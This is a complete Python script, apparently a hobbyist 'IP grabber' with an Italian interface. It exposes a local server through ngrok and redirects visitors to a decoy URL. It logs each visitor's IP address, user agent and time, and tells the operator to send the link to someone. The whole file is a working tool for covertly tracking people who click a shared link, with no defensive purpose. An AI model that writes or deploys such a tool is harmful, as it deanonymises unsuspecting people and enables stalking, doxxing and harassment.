import argparse
from http.server import HTTPServer, BaseHTTPRequestHandler
from colorama import Fore
import time
import os
import requests
from threading import Thread
import platform

os.system("cls")

os.system("title GRAB ~ kl3ssydra#4005")

print('')
print('')
print(f'')
print(f'''{Fore.RED}
          ▄████  ██▀███   ▄▄▄       ▄▄▄▄
         ██▒ ▀█▒▓██ ▒ ██▒▒████▄    ▓█████▄
        ▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒ ▄██
        ░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██ ▒██░█▀{Fore.RESET}
        {Fore.RED}░▒▓███▀▒░██▓ ▒██▒ ▓█   ▓██▒░▓█  ▀█▓
         ░▒   ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▒▓███▀▒
          ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░▒░▒   ░
        ░ ░   ░   ░░   ░   ░   ▒    ░    ░
              ░    ░           ░  ░ ░
                                         ░{Fore.RESET}
''')
print("")
print("")
print("")

parser = argparse.ArgumentParser(description="IP grabber NGROK")
parser.add_argument('-u', '--redirect-url', type=str, required=True, help="URL to redirect")
parser.add_argument('-p', '--port', type=int, default=8181, help="HTTP Server port")
parser.add_argument('-n', '--ngrok-path', type=str, default='ngrok', help="NGROK path")
parser.add_argument('-o', '--output-file', type=str, help="output file path")

args = parser.parse_args()

save = 0
iplist = []

def redirect():
    class Redirect(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(302)
            self.send_header('Location', args.redirect_url)
            self.end_headers()

        def log_message(self, format, *args):
            return

    HTTPServer(("", int(args.port)), Redirect).serve_forever()

def logip():
    global iplist
    c = 0
    r = requests.get('http://localhost:4040/api/requests/http').json()
    if args.output_file:
        log = open(args.output_file, "a+")

    for i in r['requests']:
        if r['requests'][c]['request']['headers']['X-Forwarded-For'][0] not in iplist:
            ip = r['requests'][c]['request']['headers']['X-Forwarded-For'][0]
            iplist.append(ip)
            useragent = r['requests'][c]['request']['headers']['User-Agent'][0]
            date = r['requests'][c]['start']
            info = "----------\n\x1B[31m<3\033[0m Richiesta: {}\n\x1B[31m<3\033[0m Data: {}\n\x1B[31m<3\033[0m Indirizzo: {}\n\x1B[31m<3\033[0m Amichetto: {}\n----------".format(
                iplist.index(ip),
                date, ip,
                useragent)
            print(info)
            if args.output_file:
                log.write(info)
                log.close()

        c += 1


def verifyconnection():
    global save
    while True:
        try:
            r = requests.get("http://127.0.0.1:4040/api/tunnels/command_line%20(http)").json()
            count = r['metrics']['conns']['count']
            if count > save:
                save = count
                logip()
        except:
            pass

        time.sleep(5)


def startngrok():
    try:
        if platform.system() == "Windows":
            os.system("start {} http {}".format(args.ngrok_path, args.port))
        else:
            os.system("{} http {} > /dev/null &".format(args.ngrok_path, args.port))

        print("     \x1B[31m[+]\033[0m Preparazione del database \n")
        time.sleep(3)
        r = requests.get('http://127.0.0.1:4040/api/tunnels').json()
        url = r['tunnels'][0]['public_url'].replace("https://", "http://")

        print('     \x1B[31m[+]\033[0m Link : {}'.format(url))
        print()
        print("     \x1B[31m[+]\033[0m Invia il link a qualcuno <3 \n")
    except:
        print("     \x1B[31m[#]\033[0m Qualcosa é andato storto")
        quit()


if __name__ == "__main__":
    startngrok()
    webserv = Thread(target=redirect)
    webserv.start()
    verifyconnection()
